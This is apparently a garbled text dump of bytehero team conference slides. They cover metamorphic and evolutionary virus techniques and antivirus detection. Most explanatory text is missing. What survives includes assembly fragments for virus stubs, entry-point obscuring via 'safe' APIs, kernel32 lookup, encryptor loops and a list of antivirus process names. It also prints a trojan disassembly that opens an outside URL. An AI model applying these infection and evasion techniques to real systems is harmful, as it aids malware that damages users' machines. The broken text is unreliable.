AV --  
nEINEI/[bytehero team]


·  ·  · - // · - /  · - / ·  · - / · -  · - "" · - / · - / · - / · -  ·  · AV · 
·



· //
· 1987Langton" "

· 
· // 

--  -- 

· :
· 2005,SPTHRRLF#6Code Evolution: Follow nature's example, 

· 2008,saecEOF-DR-RRLFEvolutionary Virus Propagation Technique  ...


· / · 1 
zmist · 2 VMProtectp-code
 · 3 
"" ,"" · ... ·  anti-av


· / · 1  · 2 80% · 3 N
 · 4 




·  · I :

· a) 1 - 2 - 3 - 4 - 5 - 6 - 7

·

1-2-4-5-6-7

· b): 1 - 2 - 3 - 4 - 5 - 6 - 7

·

1-2-3-3-4-5-6-7

· c): 1 - 2 - 3 - 4 - 5 - 6 - 7

·

1-2-4-3-5-6-7

· d): 1 - 2 - 3 - 4 - 5 - 6 - 7

·

1 - 2 - 3 - 4 - x1- x2 - 5 - 6 - 7

· e): a1 - a2 - a3 - a4 - a5 - a6 |b1 - b2 - b3 - b4 - b5 - b6

·

a1 - b2 - b3 - a5 - b1 - b6 |b1 - b6 - b5



· II virus code

· DNA <--> CODE | Chromosome <--> Program Function

· Genes <--> Commands | Base

<--> Bits

·  · 1000 1001 1101 1000 ... · XOR 0000 0000 0000 1000 ... · 1000 1001 1101 0000 ...

mov ax, bx random number mov ax, dx



· ,:

· CyHeSe:

· cmp ax, 36

· jge BefCyHeSe

· cmp ax, 18

· jl

SecCheck

· mov dh, 1

· sub ax, 18

· SecCheck:

· mov cl, al

· ret

CyHeSe:

cmp ax, 36

jge BefCyHeSe

cmp ax, 18

jl

SecCheck

sub ax, 18

mov dh, 1

SecCheck:

mov cl, al

ret



· 
· "DNA" 
· "" · 

·





·

+

*

= virus

· virus




*

**

**

*

· host



· virus

*

**

**

 *

-/
·  -- ""  
·  -- ""  
·    



· 

/,anti-vm

Stub Garbage Data Metamorphism Code Encrypt Data

,anti-heur static 
,anti-heur static



· "",  stub 

· START:

·

call my_DNA1

·

call my_DNA2

·

call my_DNA3

·

...

· v_code:

·

include virus_delta.inc

; 

·

include virus_get_k32_base ; kernel32.dll 

·

...

· vv_code:

·

vir_vars VIR_STRUCT <>

; 

· vEnd:

· END START



·  ·




//anti-avstub metamorphism code

encrypt data

""

· "" + " " 

· 6

· my_delta



· my_get_k32_base_addr

kernel32

· my_get_apis_addr

API

· my_find_director



· my_payload



· my_exit



· 

· my_crc32

buffcrc32

· my_infect_file



· my_lde_opsize



· my_alloc_virus_body



· my_find_jump_or_call

call/jump

· my_safe_api_address

safe-api

· my_gen_and_proc_code



· my_mig

...

""

· ""

· call

· 0xff10 ~ 0xff13 - call [Rx]

eax  edx

· 0xff16 ~ 0xff17 - call [Rx]

esi  edi

· 0xffd0 ~ 0xffd7 - call Rx

eax  edi

· 0xff15

- call [addr] 

· 0xe8

- call addr



· call

· " "

""

· call

· migpwd.exe

(7) \%system32%\ 

· mmc.exe

(7)

· mqtgsvc.exe

(15)

·

· avpcc.exe

(9) ...\avp\ 

· AVPExec.exe

(10)

· AVPInst.exe

(10)

· klav.exe

(8)

· 360Diagnose.exe 11...\360safe\  · 360FunPro.exe 9 · 360leakfixer.exe 8 · ... ·   ""46

/

· 

· 1 "" call  .

· 2 

· z0mbie 

· 8B 6588971 15%

mov modr/m

· FF 2736426 6%

push modr/m

· E8 2509099 6%

call

· 83 2240885 5%

cmp/add modr/m (including add esp, xx after call)

· 89 2045133 4%

mov modr/m

· 8D 1573296 3%

lea modr/m

· 50 1423289 3%

push eax

· 74 1269798 3%

jz

· 6A 1064820 2%

push xx

· ......

3  

/
· : · 1 fre_ins · 2 call ,call fre_ins
cross_ins_off3 · 3 cross_ins_offcall5 · cross_ins_off += calc_ins_len,1,5
cross_ins_len,4 · 4 fre_ins,2 · 5 
cp_average · ebpesp,

/
· cp_average < 1 · ebpesp>=5
ins_off,cp_average1
· ins_offjzjnz  cp_average = N,Ncross_ins_off DAN(i)hook
· winxp-sp2notepad.exe

Stub
· stub · 1ins_off5copystub
1 · 2""DNA2 · 3Safe-API3 · Safe-API  · user32.dll · ActivateKeyboardLayout(2), · GetCaretPos(5) ... · kernel32.dll · UTUnRegister(1) , · IsDBCSLeadByteEx(2) ... · Gdi32.dll · AbortDoc(1) , Chord(9) , CreateBitmap(5)...

Safe-API
· safe api   
· ;@1 0 ~ 1000h + 0x401000  · ;@2 1000h , · ;@3 7c000000hkernel32 · ;@4 80000000h · ;@5 0  10 · ;@6 0 · ;@7 push eax · ;@8 push ebx · ;@9 push [ecx+eax]; · ;@10 push edi · ;@11 push [esi]; · ... · ""


Stub 
·  · 1 call xxxxxxxx  · 2 jmp xxxxxxxx 
 · 3 push xxxxxxxx  · ret · · 4 
jmp Rx · 

Stub 
· stub
· 1 0Nsafe-APIstub
· 2 123safe-API,DNA 
· 3 
· 4  · 1 cross_ins_len == 5 ,
call xxxxxxxx stub ret. · 2 cross_ins_len > 5,stub jmp 





/
·  · 1 

· 2 , , 
· 3  kernel32...
· 4 Nexiv_der  
· 5 DNA  

/
· 

host1

host2

host3

host4

END

virus1

virus2

virus3

virus4

/
host_rgs_ctx virus_rgs_ctx.
1 esp/  
· 2 alloc host virus  stub  DNA(1),DNA(2)APIalloc  DNA(1)
· · 3 stubpusha/fd popa/fd 
DAN3 · · DNA(1) ebpebp


/
· DNA(1)DNA 
· my_DNA proc · ... · call my_restore_ctx_to_rgs ; DNA
cpu · ... · call my_save_rgs_to_ctx ; 
cpu · ret · my_DNA endp

/

· 
·  DNA DNA0  n 

· my_get_k32_base_addr proc · call my_restore_ctx_to_rgs · cmp [ebp].vir_cur_exec_dna,1 · jnz k_exit · mov [ebp].vir_cur_exec_dna,2 · my_get_k32_base_addr proc

; ;1
;1DNA

/
·  · 1
stub () ·  ·  · 2stub  · stub · 


· 1  · 2 DNA · 3 Safe-API  · 4  ·


· //stub :


· 1 va_host_addr
· 2 stubva_vir_stub_start
· 3 stub · vir_off = raw_edi - raw_stub
· 4  · va_vir_cross = va_vir_stub_start + vir_off
· 5  · dif = va_vir_cross - va_host_addr - 5

DNA
· 1 DNAv_codeoff1 · 2 stuboff2 · 3 dif = off1+off2 -5
.code Start:
call my_DAN1 call my_DNA2
...
v_code: include "vir_xx1.inc" include "vir_xx2.inc" ...
vEnd: END Start

Safe-API 
· 1 Safe-APIva_sf_off · 2 stubva_vir_stub_start · 3 stub · vir_off = raw_edi - raw_stub · 4 Safe-API · va_vir_cur = va_vir_stub_start + vir_off · 5 Safe-API · dif = va_off - va_sf_off - 5 · 



· 1 stub  

· 2 

· 1)

· 2)

· 3 :

· 1) 2)MIG 3)

· ·
(1)stub
(2) (3)

 (1)//Safe-API//
(2) (3)

(4)



· 

· MICRO_META_DATA STRUC

·

MMD_ROUTINE

DD

·

MMD_SIGNED

DB

·

MMD_OPCODE

DB

· MICRO_META_DATA ENDS

;  ;  ; 

· dd · db ·

offset mmd_stosw 1,66h,2,0ABh,0

==> 66:AB stos word ptr es:[edi] (*)-->66:8907 mov word ptr ds:[edi],ax (*)--> 83C7 02 add edi, 2

· dd · db · · · ·

offset mmd_push_exx -1,50h,0

==> 52 (*)--> ff f2 (*)--> 50
8b c3 50 58

push edx push edx push eax mov eax,ebx push eax pop eax



· 

·  

· algo1 (add/xor/sub) -- key1

· algo2 (rol/ror)

-- key2

· xy

· x = algo1 key1 x

· y = algo2 key2x 

· 

·

mov ecxVIRUS_SIZE

--------------------- (1)

·

mov edi, offset ENCRYPT_DATA --------------------- (2)

· de_code:

·

add/xor/sub dword ptr[edi],key1 --------------------- (3)

·

rol/ror key2

--------------------- (4)

·

add edi, 4

--------------------- (5)

· loop de_code

--------------------- (6)


· 1DNA DNA
· 2 DNA ,
· 3(3)(4)(5)(6)loop DNA(6),DNA(6)3 45DNAret DNA 
· 4


· DNA


· / ·  · ""
 · Safe-API,
MSVBVM60.dll ,MFC*.dll""  · ... ·   

AV

· 1 :
· , /2 5 

· 2 
·  
· , 

· 1PE 

· 2API

· [CFile.OpenFile ] [fopen]

[CreateFileA/W],

· [CreaeProcess ] [ShellexEcute] [WinExec]

· ,""

AV

· 3exedll

· 4

· 5Trojan/DL/W32/Delf.nl 

· CODE:00412835 E8 EE 0B FF FF

call sub_403428

· CODE:0041283A

loc_41283A:

· CODE:0041283A 6A 01

push 1

; nShowCmd

· CODE:0041283C 6A 00

push 0

; lpDirectory

· CODE:0041283E 6A 00

push 0

; lpParameters

· CODE:00412840 68 64 2D 41 00

push offset File ;

"http://aa.xz26.com/gg/aili.html"

· CODE:00412845 68 84 2D 41 00

push offset Operation ; "Open"

· CODE:0041284A 6A 00

push 0

; hwnd

· CODE:0041284C E8 2F 30 FF FF

call ShellExecuteA

AV
·   "" 
·  / 
· 6)  
· Trojan.Win32.Small.cif(PECompact 2.x) · bytehero team:

AV
· 0x9000036B(0x03EDF88C)--->0x00415221 VirtualAlloc · 0x90000241(0x03EDF88C)--->0x05200BAC LoadLibraryA · 0x90000197(0x03EDF88C)--->0x05200BCE GetProcAddress · ... · 0x90000333(0x03EDF88C)--->0x00409623 SetUnhandledExceptionFilter · 0x9000020E(0x03EDF88C)--->0x004095CF HeapSize · 0x900001AC(0x03EDF88C)--->0x0040561A GetStartupInfoA · ----
 · 0x90002F75(0x03EDF88C)--->0x0040104D GetModuleFileNameExA · 0x900001B6(0x03EDF88C)--->0x00401086 GetSystemDirectoryA · 0x9000013B(0x03EDF88C)--->0x00403BD7 GetCurrentProcess · 0x90002F75(0x03EDF88C)--->0x00403BDD GetModuleFileNameExA · 0x9000013B(0x03EDF88C)--->0x004028CA GetCurrentProcess · 0x90002F75(0x03EDF88C)--->0x004028D0 GetModuleFileNameExA · 0x9000004F(0x03EDF88C)--->0x0040298C CreateFileA · 0x900000B6(0x03EDF88C)--->0x004010D5 ExitProcess

AV

· Trojan.Win32.Small.cif

· 0xdb · 0xdc

: 0x40372c call[3] - > RegCreateKeyExA : 0x40378c call[3] - > RegSetValueExA

· 0xdd : 0x40379b call[3] - > RegCloseKey · ... · 0x10c : 0x403f51 call[5] - > FindNextFileA · 0x10d : 0x403f5f call[5] - > GetLastError · 0x10e : 0x403f66 call[5] - > FindClose · 0x110 : 0x402207 call[4] - > GetFileAttributesA · ... · 0x3a8 : 0x4032bd call[3] - > GetCurrentProcess · 0x3a9 : 0x4032c4 call[3] - > OpenProcessToken · 0x3aa : 0x4032d9 call[3] - > LookupPrivilegeValueA · 0x3ab : 0x403301 call[3] - > AdjustTokenPrivileges · 0x3ac : 0x40330e call[3] - > CloseHandle · 0x3b1 : 0x403fe6 call[3] - > GetCurrentDirectoryA · 0x3b2 : 0x40405e call[3] - > CreateFileA · 0x3b3 : 0x404095 call[3] - > CloseHandle · 0x3b6 : 0x4040ef call[3] - > GetSystemDirectoryA · 0x3b7 : 0x404194 call[3] - > CloseHandle

AV

· 7)windows APIanti-vm  

· 8

· __CxxFrameHandler 

· typedef struct _cxx_func_descr

·{

·

u32 magic;

// 0x19930520

·

u32 unwind_count;

·

u32 *unwind_info;

·

u32 tryblock_count;

·

u32 *tryblock; //  ,try_info

·

u32 unkown[3];

· }cxx_func_descr;

AV

· typedef struct _try_info{ · u32 start_level; · u32 end_level; · u32 catch_level; · u32 catchblock_count; · u32 *catchblock_info; //catchblock  · }try_info;

typedef struct _catchblock_info{

· u32 flags;

· u32 *type_info;

· u32 offset;

· u32 *call;

// catch 

· }catchblock_info;



· AV-Soft/ 

·  , 7C46E012API 

· 00404044 · 00404045 · 0040404A

53 E8 120E467C E8 EFCFFFFF

push ebx call kernel32.Toolhelp32ReadProcessMemory call vir.0040103E

· 

· , 


Q&A
Thanks for your attention.... neineit@gmail.com www.bytehero.com

Reference

· [1] SPTH

Code Evolution: Follow nature's example

· [2] saec.

Evolutionary Virus Propogation Technique

· [3] kaze.

Stealth api-based decryptor

· [4] z0mbie

Opcode Frequency Statistics

· [5] peter szor . The Art of Computer Virus Research and Defense

· [6] J. S. Bach. Artificial intelligence and viruses

· [7] Benny.

Benny's Metamorphic Engine for Win32

· [8] .

Virus Co-Evolutionary Genetic Algorithm


·      

